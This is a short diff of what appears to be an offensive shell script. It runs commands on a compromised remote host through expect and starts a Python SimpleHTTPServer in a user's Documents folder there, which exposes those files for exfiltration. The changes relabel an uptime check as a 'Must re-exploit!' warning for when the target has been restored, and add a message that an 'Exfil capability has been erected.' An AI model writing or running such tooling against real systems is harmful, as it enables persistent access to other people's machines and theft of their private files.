@@ -39,7 +39,7 @@ FILE_UPTIME_SECONDS=$((CURRENT_TIME - PASSFILE_MOD_TIME))
 
 # Compare remote uptime and file uptime
 if [ "$REMOTE_UPTIME_SECONDS" -lt "$FILE_UPTIME_SECONDS" ]; then
-    echo "Error: Remote system uptime ($REMOTE_UPTIME_SECONDS s) is less than time since passfile modification ($FILE_UPTIME_SECONDS s)."
+    echo "Must re-exploit! It seems as if the target system has been restored.."
     exit 1
 fi
 
@@ -67,6 +67,8 @@ send "cd /home/cindy/Documents && nohup python -m SimpleHTTPServer $counter >/de
 send "exit\r"
 expect eof
 EOF
+
+echo "Exfil capability has been erected."
 
 # Increment the counter
 newPort=$((counter + 1))
